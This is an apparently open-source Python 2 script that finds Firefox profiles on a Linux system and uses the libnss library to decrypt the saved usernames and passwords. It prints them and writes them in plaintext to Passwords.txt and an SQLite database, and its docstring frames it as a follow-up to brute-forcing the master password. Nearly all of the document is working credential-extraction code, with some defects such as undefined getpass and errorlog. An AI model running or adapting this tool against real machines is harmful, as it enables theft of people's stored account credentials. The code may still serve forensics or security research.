"""
Purpose : Get saved passwords from firefox if you have key3.db file and signons.sqlite file
This script can be used after we have completed bruteforcing master password of key3.db

Script will store decrypted passwords in Passwords.db file and also in a text file Passwords.txt

Background info:
Firefox saves its saved passwords in signons.sqlite file which is encrypted in 3DES CBC mode.
It could be decrypted using key in key3.db file.
Nowadays, most firefox users encrypts key3.db file with a master password. For using this script, first we have to buteforce
master pssword in order to decrypt username and passwords
 # this script does not bruteforce master passwords, we can use other open source tools like firemaster for that.
Script will automatically find path of key3.db and signons.sqlite in linux system and will show decrypted passwords

Usage:
python firefoxpasswords.py
This version of the scirpt does not take any argument and works on linux systems.

Dependencies :

libnss:

	https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS
	
	Network Security Services (NSS) is a set of libraries designed to support cross-platform development of 
	security-enabled client and server applications. Applications built with NSS can support SSL v2 and v3, 
	TLS, PKCS #5, PKCS #7, PKCS #11, PKCS #12, S/MIME, X.509 v3 certificates, and other security standards.

sqlalchemy:
	
	To generate and edit sqlite3 database files


"""

import base64
from ctypes import *
import struct
import glob
import sqlite3
import os
import re
import sys
import logging
import argparse
import subprocess
import string


try:
	from sqlalchemy import Column, Integer, Float, String, Text
	from sqlalchemy.ext.declarative import declarative_base
	from sqlalchemy.orm import sessionmaker
	from sqlalchemy import create_engine
except ImportError as e:
	print "Module `{0}` not installed".format(error.message[16:])
	sys.exit()

Base = declarative_base()

logging.basicConfig()
logging.getLogger('sqlalchemy.engine').setLevel(logging.ERROR)


class Passlist(Base):

	__tablename__ = 'Passwords'

	id = Column(Integer,primary_key = True)
	Site = Column(String)
	Label = Column(String)
	Value = Column(String)
	
	def __init__(self,Site,Label,Value):
		self.Site=Site
		self.Label=Label
		self.Value=Value

class SECItem(Structure):
	_fields_ = [('type',c_uint),('data',c_void_p),('len',c_uint)]
		
class secuPWData(Structure):
	_fields_ = [('source',c_ubyte),('data',c_char_p)]

(PW_NONE,PW_FROMFILE,PW_PLAINTEXT,PW_EXTERNAL)=(0,1,2,3)


class firefoxpasswords(object):
	
	def __init__(self):
		self.db = 'Passowrds.db'
		self.engine = create_engine('sqlite:///'+self.db, echo=False)
		Base.metadata.create_all(self.engine)

		Session = sessionmaker(bind=self.engine)
		self.session = Session()
		self.session.text_factory = str


	def getdir(self):
		path = os.getenv('HOME')
		usersdir = path+os.sep+".mozilla"+os.sep+'firefox'
		userdir = os.listdir(usersdir)
		result=[]
		for user in userdir:
			if os.path.isdir(usersdir+os.sep+user):
				result.append(usersdir+os.sep+user)
		return result

	def reportPass(self,Site,item,dat):
		self.Site=Site
		row = Passlist(filter(lambda x: x in string.printable, Site.decode("utf-8")),str(item), str(dat))
		self.session.add(row)
		self.session.commit()

	def readkey3(self,userpath,dbname):
		textfile = open("Passwords.txt","w")
		textfile.write("\n")
		use_pass=False
		libnss = CDLL("libnss3.so")
		uname = SECItem()
		passwd = SECItem()
		dectext = SECItem()

		pwdata = secuPWData()
		pwdata.source = PW_NONE
		pwdata.data=0

		if libnss.NSS_Init(userpath)!=0:
			print """Unable to run program. May be openssl library error. Try runnig: sudo apt-get install libssl-dev"""

		#print "Dirname: %s"%os.path.split(userpath)[-1]
		print os.path.split(userpath)

		keySlot = libnss.PK11_GetInternalKeySlot()
		libnss.PK11_CheckUserPassword(keySlot, getpass.getpass() if use_pass else "")
		libnss.PK11_Authenticate(keySlot, True, 0)
		
		conn = sqlite3.connect(userpath+os.sep+dbname)
		c = conn.cursor()
		c.execute("SELECT * FROM moz_logins;")
		for row in c:
			Site = row[1]
			print "Site : %s:"%row[1]
			uname.data  = cast(c_char_p(base64.b64decode(row[6])),c_void_p)
			uname.len = len(base64.b64decode(row[6]))
			passwd.data = cast(c_char_p(base64.b64decode(row[7])),c_void_p)
			passwd.len=len(base64.b64decode(row[7]))
			if libnss.PK11SDR_Decrypt(byref(uname),byref(dectext),byref(pwdata))==-1:
				errorlog(row,userpath+os.sep+dbname)
			username =	string_at(dectext.data,dectext.len)
			print "Username : %s" % string_at(dectext.data,dectext.len)
			if libnss.PK11SDR_Decrypt(byref(passwd),byref(dectext),byref(pwdata))==-1:
				errorlog(row,userpath+os.sep+dbname)
			password = string_at(dectext.data,dectext.len)
			print "Password : %s" % string_at(dectext.data,dectext.len)
			textfile.write("Site : " + Site + "\n")
			textfile.write("\tUSERNAME : PASSWORDS  =  " + username + " : " + password + "\n" )
			row = Passlist(filter(lambda x: x in string.printable, Site.decode("utf-8")),str(username), str(password))
			self.session.add(row)
			self.session.commit()

		c.close()
		conn.close()
		libnss.NSS_Shutdown()

def main(argv):
	#print "main fucntion"


	try:
		libnss = CDLL("libnss3.so")
	except:
		print "libnss error"

	libnss.PK11_GetInternalKeySlot.restype=c_void_p
	libnss.PK11_CheckUserPassword.argtypes=[c_void_p, c_char_p]
	libnss.PK11_Authenticate.argtypes=[c_void_p, c_int, c_void_p]

	pwdata = secuPWData()
	pwdata.source = PW_NONE
	pwdata.data=0

	osf= firefoxpasswords()
	dirs = osf.getdir()
	
	for user in dirs:
		signonfiles = glob.glob(user+os.sep+"signons*.*")
		for signonfile in signonfiles:
			(filepath,filename) = os.path.split(signonfile)
			filetype = re.findall('\.(.*)',filename)[0]
			if filetype.lower() == "sqlite":
				print ""
				osf.readkey3(filepath,filename)
			else:
				print "File could not be processed : %s" % filename
				
if __name__ == '__main__':
	main(sys.argv)